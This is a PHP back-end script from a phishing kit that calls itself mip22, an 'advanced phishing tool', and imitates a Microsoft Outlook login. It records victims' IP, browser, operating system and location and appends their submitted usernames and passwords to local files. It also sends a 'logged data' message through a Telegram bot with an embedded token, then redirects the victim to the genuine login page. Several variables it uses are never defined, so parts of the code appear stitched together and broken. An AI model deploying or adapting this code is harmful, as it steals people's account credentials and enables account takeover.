<?php 

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  mip22 is a advanced phishing tool.
*
*  mip22 is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  mip22 is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


// Set File write informations
$file = "data.txt";


// Get Full date of victim visit
$full_date = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser = $_SERVER['HTTP_USER_AGENT'];


// Get Victim Os System

function get_operating_system() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $operating_system = 'Unknown Operating System';

    //Get the operating_system name
    if (preg_match('/linux/i', $u_agent)) {
        $operating_system = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
        $operating_system = 'Mac';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
        $operating_system = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent)) {
        $operating_system = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent)) {
        $operating_system = 'IPhone';
    } elseif (preg_match('/ipod/i', $u_agent)) {
        $operating_system = 'IPod';
    } elseif (preg_match('/ipad/i', $u_agent)) {
        $operating_system = 'IPad';
    } elseif (preg_match('/android/i', $u_agent)) {
        $operating_system = 'Android';
    } elseif (preg_match('/blackberry/i', $u_agent)) {
        $operating_system = 'Blackberry';
    } elseif (preg_match('/webos/i', $u_agent)) {
        $operating_system = 'Mobile';
    }
    
    return $operating_system;
}


$os_system = get_operating_system();



// Get Victim Geolocation Info
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$PublicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json     = json_decode($json, true);
$country  = $json['country'];
$region   = $json['region'];
$city     = $json['city'];


$message ="IMPORTANT DATA WAS LOGGED\n IDENTIY  :  $ip\n\nUsername  :  $user\nPassword  :  $pass\n$uos$lh$bsr\n$is\n$city$lh$country\n$la\n$lp\n\n$uaget\n\n$url";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);
file_put_contents($file, print_r("\nOUTLOOK VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
file_put_contents($file, print_r("Country: $country \n", true), FILE_APPEND);
file_put_contents($file, print_r("Region: $region \n", true), FILE_APPEND);
file_put_contents($file, print_r("City: $city \n", true), FILE_APPEND);
file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
file_put_contents($file, "Username: " . $_POST['loginfmt'] . "\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['passwd'] . "\n", FILE_APPEND);



$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
?>

 <meta http-equiv="refresh" content="0; url=https://login.live.com/login.srf"/> 
